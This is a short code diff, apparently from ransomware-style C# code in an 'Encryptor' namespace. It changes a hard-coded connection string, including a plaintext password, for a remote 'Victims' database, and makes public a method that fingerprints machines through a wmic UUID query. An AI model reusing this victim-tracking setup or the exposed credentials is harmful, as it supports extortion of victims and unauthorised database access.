@@ -19,7 +19,7 @@ namespace Encryptor
 		// Create a String to hold the database connection string.
 		// NOTE: Put in a real database connection string here or runtime won't work
 		static string sdwConnectionString =
-			@"Data Source = victimssqlserver.database.windows.net; user id=daniel; password=Lifsgledi979; Initial Catalog = Victims;";
+			@"Data Source = victimssqlserver.database.windows.net; user id=daniel; password=MindLost1234; Initial Catalog = Victims;";
 
 		private static string UUID = GetUUID();
 		const int KEY_COLUM =1; 
@@ -118,7 +118,7 @@ namespace Encryptor
 			throw new Exception("No network adapters with an IPv4 address in the system!");
 		}
 
-		private static string GetUUID()
+		public static string GetUUID()
 		{
 			var procStartInfo = new ProcessStartInfo("cmd", "/c " + "wmic csproduct get UUID")
 			{
